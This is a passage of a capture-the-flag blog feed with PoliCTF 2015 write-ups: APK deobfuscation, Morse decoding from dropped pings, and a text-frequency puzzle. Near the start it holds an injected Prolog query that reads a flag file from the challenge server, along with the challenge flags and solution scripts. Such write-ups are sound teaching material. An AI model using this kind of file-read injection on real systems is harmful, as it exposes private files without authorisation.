</span><span class='line'>0<span class="o">)</span>, open<span class="o">(</span><span class="s1">&#39;/home/ctf/haas/jhknsjdfhef_flag_here&#39;</span>, <span class="nb">read</span>, S<span class="o">)</span>, read_line_to_codes<span class="o">(</span>S, T<span class="o">)</span>, write<span class="o">(</span>T<span class="o">)</span>.
</span><span class='line'><span class="o">[</span>102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Back to python!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">102</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">125</span><span class="p">]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">a</span><span class="p">])</span>
</span><span class='line'><span class="n">flag</span><span class="p">{</span><span class="n">Pr0gramm1ng_in_l0g1c_1s_c00l</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>50 points and first blood for Team Vulnhub.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Crack Me if You Can]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can/"/>
    <updated>2015-07-12T12:12:22+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can</id>
    <content type="html"><![CDATA[<p>Crack Me If You Can involved one of my least favorite things: Android APKs!</p>

<!--more-->


<p>I downloaded the APK and directly uploaded it to <a href="http://www.decompileandroid.com/">decompileandroid.com</a>. Among the decompiled files I found <code>src/it/politctf/LoginActivity.java</code> and three other java files. After inspecting <code>LoginActivity.java</code>, I found this function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">g</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">h</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">f</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="mh">0x7f0c0038</span><span class="o">))))))))))))))))</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="n">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">getString</span><span class="o">(</span><span class="mh">0x7f0c003c</span><span class="o">),</span> <span class="mi">1</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
</span><span class='line'>            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">else</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Interesting. It performs a bunch of operations on a string, which I don&rsquo;t know yet. However, on of the operations is this one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">c</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;buga&quot;</span><span class="o">,</span> <span class="s">&quot;Goo&quot;</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So I did the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>strings crack-me-if-you-can.apk  <span class="p">|</span>grep buga
</span><span class='line'>ee<span class="o">[[</span>c%l<span class="o">][</span>c<span class="o">{</span>g<span class="o">}[</span>%<span class="o">{</span><span class="se">\%</span>Mc%spdgj<span class="o">=]</span>T%aat%<span class="o">=</span>O%bRu%sc<span class="o">]</span>c%ti<span class="o">[</span>o%n<span class="o">=</span>Wcs%<span class="o">=</span>No<span class="o">[</span><span class="nv">t</span><span class="o">=</span>T<span class="o">][</span>hct%<span class="o">=</span>buga<span class="o">[</span><span class="nv">d</span><span class="o">=</span>As%<span class="o">=</span>W<span class="o">]</span><span class="nv">e</span><span class="o">=</span>T%ho<span class="o">[</span>u%<span class="o">[</span>%g<span class="o">]</span>h%t<span class="o">[</span>%<span class="o">}</span>%
</span></code></pre></td></tr></table></div></figure>


<p>I now had the string and all the operations on the string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">b</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;c&quot;</span><span class="o">,</span> <span class="s">&quot;a&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">b</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;%&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">c</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;[&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">d</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;]&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">e</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;\\{&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">f</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;\\}&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">g</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;c&quot;</span><span class="o">,</span> <span class="s">&quot;f&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">h</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;R&quot;</span><span class="o">,</span> <span class="s">&quot;f&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">i</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;=&quot;</span><span class="o">,</span> <span class="s">&quot;_&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">c</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;aa&quot;</span><span class="o">,</span> <span class="s">&quot;ca&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">b</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;aat&quot;</span><span class="o">,</span> <span class="s">&quot;his&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">c</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;buga&quot;</span><span class="o">,</span> <span class="s">&quot;Goo&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">d</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;spdgj&quot;</span><span class="o">,</span> <span class="s">&quot;yb%e&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using this string, I started working my way back, applying all the operations of <code>a.java</code>, <code>b.java</code> and <code>c.java</code> by hand. Finally, I ended up with the string <code>flag{Maybe_This_Obfuscation_Was_Not_That_Good_As_We_Thought}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John the Dropper]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper/"/>
    <updated>2015-07-12T12:00:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper</id>
    <content type="html"><![CDATA[<p>John the Dropper was an interesting 100 point challenge. I&rsquo;d love to see how it was implemented!</p>

<!--more-->


<p>We&rsquo;re given a host, <code>dropper.polictf.it</code>. It has no open ports, but the challenge description mentioned that John did not need ports to communicate. I left this challenge for a while, focusing on others. When I got back, superkojiman noticed that pinging this host dropped a lot of packets. He saw patterns: sometimes one packet dropped, sometimes three in a row. This made me think of Morse immediately.</p>

<p>I started pinging the host and grabbed the output of <code>ping</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING dropper.polictf.it (52.18.119.20) 56(84) bytes of data.
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=1 ttl=50 time=23.8 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=3 ttl=50 time=24.2 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=5 ttl=50 time=24.1 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=7 ttl=50 time=23.8 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=8 ttl=50 time=23.9 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=12 ttl=50 time=23.8 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=16 ttl=50 time=24.2 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=20 ttl=50 time=23.9 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=21 ttl=50 time=24.0 ms
</span><span class='line'>...snip...</span></code></pre></td></tr></table></div></figure>


<p>As you can see, request 2, 4 and 6 are dropped. With the following one-liner, I extracted the icmp_req numbers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat pings.txt <span class="p">|</span>awk <span class="s1">&#39;{print $6}&#39;</span> <span class="p">|</span>awk <span class="s1">&#39;{split($0,a,&quot;=&quot;); print a[2]}&#39;</span> &gt; sequence.txt
</span></code></pre></td></tr></table></div></figure>


<p>I wrote a python script to translate the drops to Morse:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">seq</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;sequence.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>      <span class="n">seq</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">l</span><span class="p">))</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">msg</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="n">count</span> <span class="o">+=</span> <span class="s">&#39; &#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="n">msg</span> <span class="o">+=</span> <span class="s">&#39;.&#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span><span class='line'>      <span class="n">msg</span> <span class="o">+=</span> <span class="s">&#39;-&#39;</span>
</span><span class='line'><span class="k">print</span> <span class="n">msg</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which yielded:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span> <span class="o">---</span> <span class="o">...</span>    <span class="o">-</span> <span class="o">....</span> <span class="o">..</span> <span class="o">...</span>    <span class="o">..</span> <span class="o">...</span>    <span class="o">-</span> <span class="o">....</span> <span class="o">.</span>    <span class="o">..-.</span> <span class="o">.-..</span> <span class="o">.-</span> <span class="o">--.</span> <span class="o">.--.-</span> <span class="o">..</span> <span class="o">-</span> <span class="o">-....-</span> <span class="o">..</span> <span class="o">...</span> <span class="o">-....-</span> <span class="o">-.</span> <span class="o">.</span> <span class="o">...-</span> <span class="o">.</span> <span class="o">.-.</span> <span class="o">-....-</span> <span class="o">-</span> <span class="o">---</span> <span class="o">---</span> <span class="o">-....-</span> <span class="o">.-..</span> <span class="o">.-</span> <span class="o">-</span> <span class="o">.</span> <span class="o">-....-</span> <span class="o">..-.</span> <span class="o">---</span> <span class="o">.-.</span> <span class="o">-....-</span> <span class="o">.-</span> <span class="o">-....-</span> <span class="o">-..</span> <span class="o">.-.</span> <span class="o">---</span> <span class="o">.--.</span> <span class="o">.--.--</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first three characters spell out &ldquo;SOS&rdquo;. I translated the rest by hand and found: <code>SOS THIS IS THE FLAG?IT?IS?NEVER?TOO?LATE?FOR?A?DROP?</code>. I couldn&rsquo;t really figure out the characters that are marked <code>?</code>. I guessed them to be underscores, but in the end, <a href="https://duckduckgo.com/?q=...+---+...++++-+....+..+...++++..+...++++-+....+.++++..-.+.-..+.-+--.+.--.-+..+-+-....-+..+...+-....-+-.+.+...-+.+.-.+-....-+-+---+---+-....-+.-..+.-+-+.+-....-+..-.+---+.-.+-....-+.-+-....-+-..+.-.+---+.--.+.--.--++++morse&amp;ia=answer">duckduckgo</a> came to the rescue. The final flag was lowercase: <code>flag{it-is-never-too-late-for-a-drop}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - and the Prophet Said]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-and-the-prophet-said/"/>
    <updated>2015-07-12T11:47:44+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-and-the-prophet-said</id>
    <content type="html"><![CDATA[<p>After solving the first crypto challenge of PoliCTF 2015, I moved onto the 100 point challenge.</p>

<!--more-->


<p>The download contains a text file with base64-encoded data, which becomes a .gz archive. After decompressing, I obtained a text file with biblical text. Not my cup of tea, but I immediately saw that certain sentences were duplicated. I wrote a python script to count the occurences of lines:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;text-file&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">d</span><span class="o">.</span><span class="n">get</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">w</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="n">w</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which gave me these frequencies:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
